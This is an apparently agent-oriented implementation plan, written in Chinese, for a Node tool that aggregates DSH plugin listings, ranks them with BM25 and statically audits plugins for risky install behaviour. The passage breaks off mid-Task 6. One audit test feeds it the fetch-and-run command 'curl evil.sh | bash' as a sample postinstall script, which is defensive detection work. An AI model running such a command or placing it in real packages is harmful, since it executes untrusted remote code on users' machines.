# find-dsh-plugins Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** 构建对话式查找 DSH 插件的增强版 skill —— 四源聚合 + BM25 语义检索 + 安全审计 + 安全安装，纯 Node 零依赖。

**Architecture:** SKILL.md 指令层与 scripts 脚本逻辑层分离（find-skills 架构）；`build-index.mjs` 聚合四源（岚叔/awesome/dsh.so/GitHub topic）为统一 index.json，`search.mjs` 做 BM25 粗筛 + Agent LLM 精排，`audit.mjs` 对 top-3 实时静态审计；分层新鲜度保证查询时同步刷新。

**Tech Stack:** Node.js ≥ 22（内置 fetch、node:test、node:assert），零 npm 依赖。

## Global Constraints

- Node.js ≥ 22（使用内置 fetch 与 node:test）
- **零外部 npm 依赖**：脚本只用 node: 内置模块；测试用 `node --test`
- **Node ≥ 23 测试命令注意**：`node --test` 的位置参数按 glob 处理，裸目录（如 `tests/`）会
  报 MODULE_NOT_FOUND。统一用 `node --test`（无参数，自动发现 `tests/` 下测试）或
  `node --test tests/xxx.test.mjs`（单文件路径）。已实测（Node v24.9.0）两种形式均通过。
- 仓库路径：`~/WorkingPlace/Coding/AI/find-dsh-plugins/`（git 已 init，已有设计文档 commit）
- LICENSE：BSD-3-Clause（独立授权，代码全部自写）
- **禁止 emoji 字符**（README/代码/提交信息均不得使用）
- 提交信息用中文，格式 `feat|fix|docs|test: <摘要>`
- 设计依据：`docs/superpowers/specs/2026-08-15-find-dsh-plugins-design.md`（已批准）
- 数据源字段结构（2026-08-15 实测）：
  - 岚叔 `/api/plugins`：`plugins[]` 含 `id/name/owner/repo/url/category/description{en,zh}/curated/topic/stars/pushedAt/updatedAt/license/archived/maintenance/installCommand/screening/attention`
  - awesome `/plugins.json`：`plugins[]` 含 `name/owner/url/category/description{en,zh}/npm/stars/install/added`
  - dsh.so `/plugins-index.json`：`plugins[]` 含 `id/name/description/stars/topics/install/url`
  - GitHub topic search：`items[]` 含 `full_name/name/description/topics/stargazers_count/pushed_at/html_url`

---

### Task 1: 项目骨架

**Files:**
- Create: `package.json`
- Create: `LICENSE`
- Create: `.gitignore`
- Create: `tests/.gitkeep`

**Interfaces:**
- Consumes: 无
- Produces: `npm test` 命令（运行 `node --test`，自动发现 `tests/`）；后续所有任务依赖此骨架

- [ ] **Step 1: 创建 package.json**

```json
{
  "name": "find-dsh-plugins",
  "version": "0.1.0",
  "private": true,
  "type": "module",
  "description": "对话式查找 DSH 插件的增强版 skill：语义检索 × 四源聚合 × 安全审计",
  "scripts": {
    "test": "node --test"
  },
  "engines": {
    "node": ">=22"
  },
  "license": "BSD-3-Clause"
}
```

- [ ] **Step 2: 创建 LICENSE（BSD-3-Clause 全文）**

```text
BSD 3-Clause License

Copyright (c) 2026, JazzuLu
All rights reserved.

Redistribution and use in source and binary forms, with or without
modification, are permitted provided that the following conditions are met:

1. Redistributions of source code must retain the above copyright notice, this
   list of conditions and the following disclaimer.

2. Redistributions in binary form must reproduce the above copyright notice,
   this list of conditions and the following disclaimer in the documentation
   and/or other materials provided with the distribution.

3. Neither the name of the copyright holder nor the names of its
   contributors may be used to endorse or promote products derived from
   this software without specific prior written permission.

THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS"
AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE
DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE
FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL
DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR
SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER
CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY,
OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE
OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
```

- [ ] **Step 3: 创建 .gitignore**

```text
node_modules/
*.log
.DS_Store
index.json
index.meta.json
```

> 注：index.json / index.meta.json 是运行时缓存，不入库。

- [ ] **Step 4: 创建 tests/.gitkeep 并验证**

```bash
mkdir -p tests scripts references
touch tests/.gitkeep
node --test
```

Expected: `ℹ pass 0`（空测试目录通过），exit 0，无报错。

- [ ] **Step 5: Commit**

```bash
git add package.json LICENSE .gitignore tests/.gitkeep
git commit -m "chore: 项目骨架（package.json/LICENSE/gitignore/测试目录）"
```

---

### Task 2: BM25 检索模块（search.mjs 核心）

**Files:**
- Create: `scripts/search.mjs`（本任务只实现并导出 BM25 纯函数；CLI 入口在 Task 7 加）
- Test: `tests/bm25.test.mjs`

**Interfaces:**
- Consumes: 无
- Produces:
  - `tokenize(text: string): string[]` — 中文 bigram + 英文/数字分词
  - `bm25(queryTokens, docTokens, df, N, avgdl, dl, k1?, b?): number` — 单文档 BM25 打分
  - `searchTopK(query, plugins, k = 30): { plugin, score }[]` — 加权字段 BM25 粗筛

- [ ] **Step 1: 写失败测试**

```js
// tests/bm25.test.mjs
import { test } from 'node:test'
import assert from 'node:assert/strict'
import { tokenize, searchTopK } from '../scripts/search.mjs'

test('tokenize 中文 bigram 与英文分词', () => {
  const tokens = tokenize('统计token用量的插件')
  assert.ok(tokens.includes('统计'))
  assert.ok(tokens.includes('计t'))
  assert.ok(tokens.includes('token'))
  assert.ok(tokens.includes('用量'))
})

test('searchTopK 语义近似命中（含 2-gram 共享）', () => {
  const plugins = [
    { id: 'a', name: 'dsh-live-stats', description: '实时显示 token 用量与生成速度', categories: [], topics: [] },
    { id: 'b', name: 'dsh-pet', description: '桌面宠物鲸鱼娘', categories: [], topics: [] },
  ]
  const top = searchTopK('统计token用量的插件', plugins, 1)
  assert.equal(top[0].plugin.id, 'a')
})

test('searchTopK 按 k 截断且按分数降序', () => {
  const plugins = [
    { id: 'a', name: 'a', description: 'token 统计', categories: [], topics: [] },
    { id: 'b', name: 'b', description: 'token 统计', categories: [], topics: [] },
    { id: 'c', name: 'c', description: 'token 统计', categories: [], topics: [] },
  ]
  const top = searchTopK('token', plugins, 2)
  assert.equal(top.length, 2)
  assert.ok(top[0].score >= top[1].score)
})
```

- [ ] **Step 2: 运行确认失败**

Run: `node --test tests/bm25.test.mjs`
Expected: FAIL，`Error [ERR_MODULE_NOT_FOUND]`（../scripts/search.mjs 不存在）

- [ ] **Step 3: 实现 BM25 纯函数**

```js
// scripts/search.mjs
// BM25 检索核心（纯函数，可被 tests 直接 import；CLI 入口在 Task 7 追加）

export function tokenize(text) {
  const lower = String(text).toLowerCase()
  const tokens = []
  for (const m of lower.matchAll(/[a-z0-9]+/g)) tokens.push(m[0])
  const cjk = lower.replace(/[^\u4e00-\u9fff]/g, '')
  for (let i = 0; i < cjk.length - 1; i++) tokens.push(cjk.slice(i, i + 2))
  return tokens
}

function docFreq(plugins, getTokens) {
  const df = new Map()
  for (const p of plugins) {
    for (const t of new Set(getTokens(p))) df.set(t, (df.get(t) ?? 0) + 1)
  }
  return df
}

export function bm25(queryTokens, docTokens, df, N, avgdl, dl, k1 = 1.5, b = 0.75) {
  let score = 0
  for (const t of queryTokens) {
    const tf = docTokens.filter((x) => x === t).length
    if (tf === 0) continue
    const idf = Math.log(1 + (N - (df.get(t) ?? 0) + 0.5) / ((df.get(t) ?? 0) + 0.5))
    score += idf * ((tf * (k1 + 1)) / (tf + k1 * (1 - b + (b * dl) / avgdl)))
  }
  return score
}

export function searchTopK(query, plugins, k = 30) {
  const weights = { name: 1.5, description: 1.0, categories: 0.5, topics: 0.5 }
  const fieldText = (p) => {
    const parts = []
    parts.push(...Array(Math.round(weights.name)).fill(p.name ?? ''))
    parts.push(p.description ?? '')
    parts.push(...(p.categories ?? []).map((c) => c.replace(/[-_]/g, ' ')))
    parts.push(...(p.topics ?? []))
    return parts.join(' ')
  }
  const queryTokens = tokenize(query)
  const docs = plugins.map((p) => ({ p, tokens: tokenize(fieldText(p)) }))
  const df = docFreq(plugins, (p) => tokenize(fieldText(p)))
  const N = docs.length
  const avgdl = N === 0 ? 1 : docs.reduce((s, d) => s + d.tokens.length, 0) / N
  const scored = docs
    .map((d) => ({ plugin: d.p, score: bm25(queryTokens, d.tokens, df, N, avgdl, d.tokens.length) }))
    .filter((s) => s.score > 0)
    .sort((a, b) => b.score - a.score)
    .slice(0, k)
  return scored
}
```

- [ ] **Step 4: 运行确认通过**

Run: `node --test tests/bm25.test.mjs`
Expected: `# pass 3`

- [ ] **Step 5: Commit**

```bash
git add scripts/search.mjs tests/bm25.test.mjs
git commit -m "feat: BM25 检索核心（中文 bigram 分词 + 加权打分 + topK 截断）"
```

---

### Task 3: 源规范化与统一索引合并（build-index.mjs 核心）

**Files:**
- Create: `scripts/build-index.mjs`（本任务只实现并导出 normalize 与 merge 纯函数；CLI 在 Task 6 加）
- Create: `tests/fixtures/lanshu-sample.json`、`tests/fixtures/awesome-sample.json`、`tests/fixtures/dshso-sample.json`、`tests/fixtures/github-sample.json`
- Test: `tests/merge.test.mjs`

**Interfaces:**
- Consumes: 无
- Produces:
  - `normalizeLanshu(p): Entry` / `normalizeAwesome(p): Entry` / `normalizeDshso(p): Entry` / `normalizeGithub(r): Entry`
  - `mergePlugins(entries: Entry[]): Plugin[]` — 按 repo 合并去重
  - `Entry = { key, repo, url, name, description: {en,zh}, stars, pushedAt, categories, evidence: {level, source}, sources: string[], npm? }`
  - `Plugin = Entry & { id, installHint }`

- [ ] **Step 1: 写 fixture（真实数据小样本）**

```json
// tests/fixtures/lanshu-sample.json
{ "plugins": [
  { "id": "huiliyi37/dsh-tianshu-tui", "name": "dsh-tianshu-tui", "owner": "huiliyi37", "repo": "huiliyi37/dsh-tianshu-tui", "url": "https://github.com/huiliyi37/dsh-tianshu-tui", "category": "ui", "description": { "en": "A terminal UI (TUI) for DeepSeek Harness.", "zh": "DeepSeek Harness 的终端 UI（TUI）。" }, "curated": true, "topic": true, "stars": 104, "pushedAt": "2026-08-13T00:00:00Z", "installCommand": "dsh plugin --profile web add dsh-tianshu-tui" }
] }
```

```json
// tests/fixtures/awesome-sample.json
{ "plugins": [
  { "name": "dsh-live-stats", "owner": "zhu1090093659", "url": "https://github.com/zhu1090093659/dsh-web-ui", "category": "ui", "description": { "en": "Live token statistics.", "zh": "实时令牌统计。" }, "npm": "dsh-live-stats", "stars": 1416 }
] }
```

```json
// tests/fixtures/dshso-sample.json
{ "plugins": [
  { "id": "dsh-ssh", "name": "dsh-ssh", "description": "SSH 远程运维面板：Web 终端、文件传输、端口转发。", "stars": 512, "topics": [], "install": "dsh plugin --profile web add dsh-ssh", "url": "https://www.dsh.so/plugins/dsh-ssh/" }
] }
```

```json
// tests/fixtures/github-sample.json
{ "items": [
  { "full_name": "zhu1090093659/dsh-web-ui", "name": "dsh-web-ui", "description": "DSH Web UI 插件与皮肤合集", "topics": ["dsh-plugin", "web-ui"], "stargazers_count": 1416, "pushed_at": "2026-08-10T12:00:00Z", "html_url": "https://github.com/zhu1090093659/dsh-web-ui" }
] }
```

- [ ] **Step 2: 写失败测试**

```js
// tests/merge.test.mjs
import { test } from 'node:test'
import assert from 'node:assert/strict'
import { readFileSync } from 'node:fs'
import { normalizeLanshu, normalizeAwesome, normalizeDshso, normalizeGithub, mergePlugins } from '../scripts/build-index.mjs'

const load = (f) => JSON.parse(readFileSync(new URL(`./fixtures/${f}`, import.meta.url), 'utf8'))

test('各源 normalize 输出统一 Entry 形状', () => {
  const l = normalizeLanshu(load('lanshu-sample.json').plugins[0])
  assert.equal(l.repo, 'huiliyi37/dsh-tianshu-tui')
  assert.equal(l.evidence.level, 'LISTED')
  assert.deepEqual(l.sources, ['lanshu'])
  const a = normalizeAwesome(load('awesome-sample.json').plugins[0])
  assert.equal(a.repo, 'zhu1090093659/dsh-web-ui')
  assert.equal(a.evidence.level, 'CURATED')
  const d = normalizeDshso(load('dshso-sample.json').plugins[0])
  assert.equal(d.repo, 'dsh-ssh')
  assert.equal(d.evidence.level, 'INDEXED')
  const g = normalizeGithub(load('github-sample.json').items[0])
  assert.equal(g.repo, 'zhu1090093659/dsh-web-ui')
  assert.equal(g.evidence.level, 'TOPIC')
})

test('mergePlugins 同 repo 多源合并：sources 累积、描述取最全、evidence 取最严格', () => {
  const entries = [
    normalizeGithub(load('github-sample.json').items[0]),
    normalizeAwesome(load('awesome-sample.json').plugins[0]),
  ]
  const merged = mergePlugins(entries)
  assert.equal(merged.length, 1)
  assert.ok(merged[0].sources.includes('github') && merged[0].sources.includes('awesome'))
  assert.equal(merged[0].description.zh, '实时令牌统计。')
  assert.equal(merged[0].evidence.level, 'CURATED')
  assert.equal(merged[0].installHint, 'unknown')
})
```

- [ ] **Step 3: 运行确认失败**

Run: `node --test tests/merge.test.mjs`
Expected: FAIL，ERR_MODULE_NOT_FOUND（build-index.mjs 不存在）

- [ ] **Step 4: 实现 normalize 与 merge**

```js
// scripts/build-index.mjs
// 四源规范化与统一索引合并（纯函数；CLI 入口在 Task 6 追加）

const EVIDENCE_RANK = { LISTED: 4, CURATED: 3, INDEXED: 2, TOPIC: 1, TOPIC_ONLY: 0 }

function entry(seed) {
  return {
    key: seed.repo.toLowerCase(),
    repo: seed.repo,
    url: seed.url,
    name: seed.name,
    description: seed.description ?? { en: '', zh: '' },
    stars: seed.stars ?? 0,
    pushedAt: seed.pushedAt ?? '',
    categories: seed.categories ?? [],
    evidence: seed.evidence,
    sources: seed.sources,
    npm: seed.npm,
  }
}

export function normalizeLanshu(p) {
  const repo = p.repo ?? p.id
  return entry({
    repo,
    url: p.url ?? `https://github.com/${repo}`,
    name: p.name,
    description: p.description ?? { en: '', zh: '' },
    stars: p.stars ?? 0,
    pushedAt: p.pushedAt ?? '',
    categories: p.category ? [p.category] : [],
    evidence: {
      level: p.curated ? 'LISTED' : 'TOPIC',
      source: 'lanshu',
      screening: p.screening ?? null,
      attention: p.attention ?? null,
    },
    sources: ['lanshu'],
  })
}

export function normalizeAwesome(p) {
  return entry({
    repo: (p.url ?? '').replace(/^https?:\/\/github\.com\//, '') || p.name,
    url: p.url,
    name: p.name,
    description: p.description ?? { en: '', zh: '' },
    stars: p.stars ?? 0,
    pushedAt: '',
    categories: p.category ? [p.category] : [],
    evidence: { level: 'CURATED', source: 'awesome' },
    sources: ['awesome'],
    npm: p.npm,
  })
}

export function normalizeDshso(p) {
  const desc = typeof p.description === 'string' ? { en: p.description, zh: p.description } : p.description
  return entry({
    repo: p.id,
    url: p.url ?? `https://github.com/${p.id}`,
    name: p.name ?? p.id,
    description: desc ?? { en: '', zh: '' },
    stars: p.stars ?? 0,
    pushedAt: '',
    categories: (p.topics ?? []).slice(0, 3),
    evidence: { level: 'INDEXED', source: 'dshso' },
    sources: ['dshso'],
  })
}

export function normalizeGithub(r) {
  const desc = { en: r.description ?? '', zh: r.description ?? '' }
  return entry({
    repo: r.full_name,
    url: r.html_url,
    name: r.name,
    description: desc,
    stars: r.stargazers_count ?? 0,
    pushedAt: r.pushed_at ?? '',
    categories: (r.topics ?? []).filter((t) => t !== 'dsh-plugin').slice(0, 3),
    evidence: { level: 'TOPIC', source: 'github' },
    sources: ['github'],
  })
}

export function mergePlugins(entries) {
  const byKey = new Map()
  for (const e of entries) {
    const cur = byKey.get(e.key)
    if (!cur) {
      byKey.set(e.key, { ...e, sources: [...e.sources], categories: [...e.categories] })
      continue
    }
    cur.sources = [...new Set([...cur.sources, ...e.sources])]
    cur.evidence =
      EVIDENCE_RANK[e.evidence.level] > EVIDENCE_RANK[cur.evidence.level] ? e.evidence : cur.evidence
    if (e.description.zh && e.description.zh.length > (cur.description.zh ?? '').length) {
      cur.description = e.description
    } else if (!cur.description.en && e.description.en) {
      cur.description = { ...cur.description, en: e.description.en }
    }
    if (e.stars > cur.stars) cur.stars = e.stars
    if (e.pushedAt > cur.pushedAt) cur.pushedAt = e.pushedAt
    if (!cur.npm && e.npm) cur.npm = e.npm
  }
  const plugins = [...byKey.values()].map((p) => ({
    ...p,
    id: p.repo.split('/').pop() ?? p.name,
    installHint: 'unknown',
  }))
  return plugins
}
```

- [ ] **Step 5: 运行确认通过**

Run: `node --test tests/merge.test.mjs`
Expected: `# pass 2`

- [ ] **Step 6: Commit**

```bash
git add scripts/build-index.mjs tests/merge.test.mjs tests/fixtures/
git commit -m "feat: 四源 normalize 与统一索引 merge（证据级别排序 + 多源合并去重）"
```

---

### Task 4: 分层新鲜度与本地缓存（build-index.mjs 增量）

**Files:**
- Modify: `scripts/build-index.mjs`（追加 freshness/cache 纯函数）
- Test: `tests/merge.test.mjs`（追加用例）

**Interfaces:**
- Consumes: Task 3 的 `mergePlugins`
- Produces:
  - `isLayerFresh(meta, layer, ttlMs): boolean` — 检查某层新鲜度
  - `CACHE_DIR`、`INDEX_PATH`、`META_PATH`、`LAYER_TTL_MS`（常量导出）
  - `LAYER_TTL_MS = { curated: 30*60_000, githubIncremental: 15*60_000, githubFull: 24*3600_000 }`

- [ ] **Step 1: 写失败测试（追加到 tests/merge.test.mjs 末尾）**

```js
import { isLayerFresh, LAYER_TTL_MS } from '../scripts/build-index.mjs'

test('isLayerFresh 按层 TTL 判断', () => {
  const now = Date.now()
  const meta = { layers: { curated: { at: now - 10 * 60_000 } } }
  assert.equal(isLayerFresh(meta, 'curated', now), true)      // 10min < 30min
  const stale = { layers: { curated: { at: now - 40 * 60_000 } } }
  assert.equal(isLayerFresh(stale, 'curated', now), false)    // 40min > 30min
  assert.equal(isLayerFresh({ layers: {} }, 'curated', now), false) // 无记录视为过期
  assert.equal(LAYER_TTL_MS.curated, 30 * 60_000)
})
```

- [ ] **Step 2: 运行确认失败**

Run: `node --test tests/merge.test.mjs`
Expected: FAIL，`isLayerFresh is not a function`

- [ ] **Step 3: 实现 freshness 常量与函数**

```js
// 追加到 scripts/build-index.mjs 末尾
import { mkdirSync } from 'node:fs'
import { dirname, join } from 'node:path'
import { fileURLToPath } from 'node:url'

const __dirname = dirname(fileURLToPath(import.meta.url))
export const CACHE_DIR = join(__dirname, '..', '.cache')
export const INDEX_PATH = join(CACHE_DIR, 'index.json')
export const META_PATH = join(CACHE_DIR, 'meta.json')
export const LAYER_TTL_MS = {
  curated: 30 * 60_000,
  githubIncremental: 15 * 60_000,
  githubFull: 24 * 3600_000,
}

export function isLayerFresh(meta, layer, now = Date.now()) {
  const at = meta?.layers?.[layer]?.at
  if (typeof at !== 'number') return false
  return now - at < LAYER_TTL_MS[layer]
}

export function ensureCacheDir() {
  mkdirSync(CACHE_DIR, { recursive: true })
}
```

- [ ] **Step 4: 运行确认通过**

Run: `node --test tests/merge.test.mjs`
Expected: `# pass 3`

- [ ] **Step 5: Commit**

```bash
git add scripts/build-index.mjs tests/merge.test.mjs
git commit -m "feat: 分层新鲜度判断与缓存路径常量"
```

---

### Task 5: 安全审计模块（audit.mjs）

**Files:**
- Create: `scripts/audit.mjs`
- Test: `tests/audit.test.mjs`

**Interfaces:**
- Consumes: 无
- Produces:
  - `detectRisk(pkgJson, readmeText): { hasLifecycleScripts, writesOutsideHome, modifiesShell, risk: 'low'|'medium'|'high', details: string[] }`
  - `auditRepo(repo, fetchImpl?): Promise<AuditResult>` — 拉 raw package.json + README 后调用 detectRisk（fetchImpl 可注入以便测试）

- [ ] **Step 1: 写失败测试**

```js
// tests/audit.test.mjs
import { test } from 'node:test'
import assert from 'node:assert/strict'
import { detectRisk, auditRepo } from '../scripts/audit.mjs'

test('detectRisk 识别 lifecycle 脚本', () => {
  const r = detectRisk({ scripts: { postinstall: 'curl evil.sh | bash' } }, 'no readme')
  assert.equal(r.hasLifecycleScripts, true)
  assert.ok(r.details.some((d) => d.includes('postinstall')))
})

test('detectRisk 识别写 HOME 外路径与 shell 配置', () => {
  const r = detectRisk({}, 'installs to /etc/foo and modifies ~/.zshrc and ~/.bashrc')
  assert.equal(r.writesOutsideHome, true)
  assert.equal(r.modifiesShell, true)
  assert.equal(r.risk, 'high')
})

test('detectRisk 干净插件为 low', () => {
  const r = detectRisk({ scripts: { build: 'tsc' } }, 'a simple plugin')
  assert.equal(r.risk, 'low')
})

test('auditRepo 用注入 fetch 拉取并审计', async () => {
  const calls = []
  const fetchImpl = async (url) => {
    calls.push(url)
    if (url.includes('package.json')) {
      return { ok: true, json: async () => ({ scripts: { install: 'sh setup.sh' } }) }
    }
    return { ok: true, text: async () => 'readme text' }
  }
  const result = await auditRepo('owner/repo', fetchImpl)
  assert.equal(result.hasLifecycleScripts, true)
  assert.ok(calls.some((u) => u.includes('raw.githubusercontent.com/owner/repo')))
})
```

- [ ] **Step 2: 运行确认失败**

Run: `node --test tests/audit.test.mjs`
Expected: FAIL，ERR_MODULE_NOT_FOUND

- [ ] **Step 3: 实现 audit.mjs**

```js
// scripts/audit.mjs
// 静态安全审计：不装依赖、不跑代码，只读 package.json 与 README 文本

const LIFECYCLE_KEYS = ['preinstall', 'install', 'postinstall', 'prepare']
const OUTSIDE_HOME_PATTERNS = [/\/etc\//i, /\/usr\//i, /\/opt\//i, /C:\\Program Files/i, /\/var\//i]
const SHELL_PATTERNS = [/\.bashrc/i, /\.zshrc/i, /\.profile/i, /shell.?config/i, /fish\.config/i]

export function detectRisk(pkgJson, readmeText) {
  const details = []
  const scripts = pkgJson?.scripts ?? {}
  const lifecycle = LIFECYCLE_KEYS.filter((k) => typeof scripts[k] === 'string')
  const hasLifecycleScripts = lifecycle.length > 0
  if (hasLifecycleScripts) {
    details.push(`发现 lifecycle 脚本: ${lifecycle.join(', ')}`)
    for (const k of lifecycle) details.push(`  ${k}: ${scripts[k]}`)
  }
  const writesOutsideHome = OUTSIDE_HOME_PATTERNS.some((re) => re.test(readmeText ?? ''))
  if (writesOutsideHome) details.push('安装文档疑似写入 HOME 之外路径')
  const modifiesShell = SHELL_PATTERNS.some((re) => re.test(readmeText ?? ''))
  if (modifiesShell) details.push('安装文档疑似修改 shell 配置')
  const risk = hasLifecycleScripts && (writesOutsideHome || modifiesShell) ? 'high'
    : hasLifecycleScripts || writesOutsideHome || modifiesShell ? 'medium'
    : 'low'
  return { hasLifecycleScripts, writesOutsideHome, modifiesShell, risk, details }
}

export async function auditRepo(repo, fetchImpl = fetch) {
  const base = `https://raw.githubusercontent.com/${repo}/main`
  const details = []
  let hasLifecycleScripts = false
  let writesOutsideHome = false
  let modifiesShell = false
  try {
    const pkgRes = await fetchImpl(`${base}/package.json`)
    if (pkgRes.ok) {
      const pkg = await pkgRes.json()
      const r = detectRisk(pkg, '')
      hasLifecycleScripts = r.hasLifecycleScripts
      details.push(...r.details)
    }
  } catch { details.push('package.json 读取失败') }
  try {
    const readmeRes = await fetchImpl(`${base}/README.md`)
    if (readmeRes.ok) {
      const text = await readmeRes.text()
      const r = detectRisk({}, text)
      writesOutsideHome = r.writesOutsideHome
      modifiesShell = r.modifiesShell
      details.push(...r.details)
    }
  } catch { details.push('README 读取失败') }
  const risk = hasLifecycleScripts && (writesOutsideHome || modifiesShell) ? 'high'
    : hasLifecycleScripts || writesOutsideHome || modifiesShell ? 'medium'
    : 'low'
  return { hasLifecycleScripts, writesOutsideHome, modifiesShell, risk, details }
}

// CLI 入口：node scripts/audit.mjs <owner/repo>
if (import.meta.url === pathToFileURL(process.argv[1] ?? '').href) {
  const repo = process.argv[2]
  if (!repo) {
    console.error('用法: node scripts/audit.mjs <owner/repo>')
    process.exit(1)
  }
  const result = await auditRepo(repo)
  console.log(JSON.stringify(result, null, 2))
}
```

> 注：CLI 段引用了 `pathToFileURL`，需在 audit.mjs 顶部 import 区加入：
> `import { pathToFileURL } from 'node:url'`

- [ ] **Step 4: 运行确认通过**

Run: `node --test tests/audit.test.mjs`
Expected: `# pass 4`

- [ ] **Step 5: Commit**

```bash
git add scripts/audit.mjs tests/audit.test.mjs
git commit -m "feat: 静态安全审计（lifecycle 脚本/写路径/shell 配置 + 风险分级）"
```

---

### Task 6: build-index.mjs CLI（四源拉取 + 降级 + 缓存落盘）

**Files:**
- Modify: `scripts/build-index.mjs`（追加 fetch 与 CLI）
- Test: `tests/fetch-sources.test.mjs`（用注入 fetch 测降级）

**Interfaces:**
- Consumes: Task 3 normalize/merge、Task 4 freshness/缓存常量
- Produces:
  - `fetchSource(name, url, parse, fetchImpl?): Promise<{ ok, count, entries }>`
  - `buildIndex({ fetchImpl?, now? }): Promise<{ index, meta }>` — 增量/全量分层刷新
  - CLI：`node scripts/build-index.mjs`（默认增量刷新过期层）、`--refresh`（强制刷新 curated+增量）、`--refresh-full`（强制全量）、`--quiet`

- [ ] **Step 1: 写失败测试**

```js
// tests/fetch-sources.test.mjs
import { test } from 'node:test'
import assert from 'node:assert/strict'
import { fetchSource } from '../scripts/build-index.mjs'

test('fetchSource 成功解析 entries', async () => {
  const fetchImpl = async () => ({ ok: true, json: async () => ({ plugins: [{ id: 'x/y', name: 'x', description: 'd', stars: 1 }] }) })
  const r = await fetchSource('lanshu', 'https://example.com/api', async (d) => d.plugins.map((p) => p), fetchImpl)
  assert.equal(r.ok, true)
  assert.equal(r.count, 1)
})

test('fetchSource 失败降级不抛错', async () => {
  const fetchImpl = async () => { throw new Error('network down') }
  const r = await fetchSource('dshso', 'https://example.com/index', async (d) => [], fetchImpl)
  assert.equal(r.ok, false)
  assert.equal(r.count, 0)
})
```

- [ ] **Step 2: 运行确认失败**

Run: `node --test tests/fetch-sources.test.mjs`
Expected: FAIL，`fetchSource is not a function`

- [ ] **Step 3: 实现四源拉取与 CLI**

```js
// 追加到 scripts/build-index.mjs 的 import 区（与现有 import 合并）：
// import { readFileSync, writeFileSync } from 'node:fs'
// import { pathToFileURL } from 'node:url'
// 以下代码追加到文件末尾：

export async function fetchSource(name, url, parse, fetchImpl = fetch) {
  try {
    const res = await fetchImpl(url, { signal: AbortSignal.timeout(25_000), headers: { 'user-agent': 'find-dsh-plugins' } })
    if (!res.ok) return { ok: false, count: 0, entries: [], error: `HTTP ${res.status}` }
    const data = await res.json()
    const entries = parse(data)
    return { ok: true, count: entries.length, entries }
  } catch (err) {
    return { ok: false, count: 0, entries: [], error: String(err.message ?? err) }
  }
}

const GITHUB_TOPIC_QUERY = 'topic:dsh-plugin is:public archived:false'

async function fetchGithubTopic(pages) {
  const all = []
  for (let page = 1; page <= pages; page += 1) {
    const url = new URL('https://api.github.com/search/repositories')
    url.searchParams.set('q', GITHUB_TOPIC_QUERY)
    url.searchParams.set('sort', 'updated')
    url.searchParams.set('order', 'desc')
    url.searchParams.set('per_page', '100')
    url.searchParams.set('page', String(page))
    const r = await fetchSource('github', url.toString(), (d) => d.items ?? [], fetch)
    if (!r.ok) break
    all.push(...r.entries)
  }
  return all.map(normalizeGithub)
}

export async function buildIndex(opts = {}) {
  const { fetchImpl = fetch, now = Date.now() } = opts
  const meta = readMeta() ?? { layers: {} }
  const sources = { lanshu: { ok: true }, awesome: { ok: true }, dshso: { ok: true }, githubTopic: { ok: true } }
  const entries = []
  const curatedFresh = isLayerFresh(meta, 'curated', now)
  if (curatedFresh) {
    const cached = readIndex()
    if (cached) return { index: cached, meta, cached: true }
  }
  const curated = await Promise.all([
    fetchSource('lanshu', 'https://dsh.lanshuagent.com/api/plugins', (d) => d.plugins.map(normalizeLanshu), fetchImpl),
    fetchSource('awesome', 'https://awesome-dsh-plugin.com/plugins.json', (d) => d.plugins.map(normalizeAwesome), fetchImpl),
    fetchSource('dshso', 'https://www.dsh.so/plugins-index.json', (d) => d.plugins.map(normalizeDshso), fetchImpl),
  ])
  const CURATED_NAMES = ['lanshu', 'awesome', 'dshso']
  for (let i = 0; i < curated.length; i += 1) {
    const r = curated[i]
    sources[CURATED_NAMES[i]] = { ok: r.ok }
    if (r.ok) entries.push(...r.entries)
  }
  const githubFull = !isLayerFresh(meta, 'githubFull', now)
  const githubIncremental = !isLayerFresh(meta, 'githubIncremental', now)
  if (githubIncremental || githubFull) {
    const gh = await fetchGithubTopic(githubFull ? 10 : 2)
    entries.push(...gh)
    if (githubFull) meta.layers.githubFull = { at: now }
    meta.layers.githubIncremental = { at: now }
  }
  const plugins = mergePlugins(entries)
  const index = { schemaVersion: 1, generatedAt: new Date(now).toISOString(), sources, plugins }
  meta.layers.curated = { at: now }
  writeIndex(index, meta)
  return { index, meta, cached: false }
}

function readIndex() {
  try { return JSON.parse(readFileSync(INDEX_PATH, 'utf8')) } catch { return null }
}
function readMeta() {
  try { return JSON.parse(readFileSync(META_PATH, 'utf8')) } catch { return null }
}
function writeIndex(index, meta) {
  ensureCacheDir()
  writeFileSync(INDEX_PATH, JSON.stringify(index))
  writeFileSync(META_PATH, JSON.stringify(meta))
}

// CLI 入口
if (import.meta.url === pathToFileURL(process.argv[1] ?? '').href) {
  const args = process.argv.slice(2)
  const { index, meta } = await buildIndex()
  if (!args.includes('--quiet')) {
    console.log(`索引生成完成: ${index.plugins.length} 个插件`)
    console.log(`数据源状态: ${JSON.stringify(index.sources)}`)
  }
}
```

- [ ] **Step 4: 运行确认通过**

Run: `node --test tests/fetch-sources.test.mjs`
Expected: `# pass 2`

- [ ] **Step 5: 真实网络冒烟验证**

Run: `node scripts/build-index.mjs --quiet && ls -la .cache/`
Expected: `.cache/index.json` 与 `.cache/meta.json` 生成；index.json 的 plugins 数量在 300-2000 之间。

- [ ] **Step 6: Commit**

```bash
git add scripts/build-index.mjs tests/fetch-sources.test.mjs
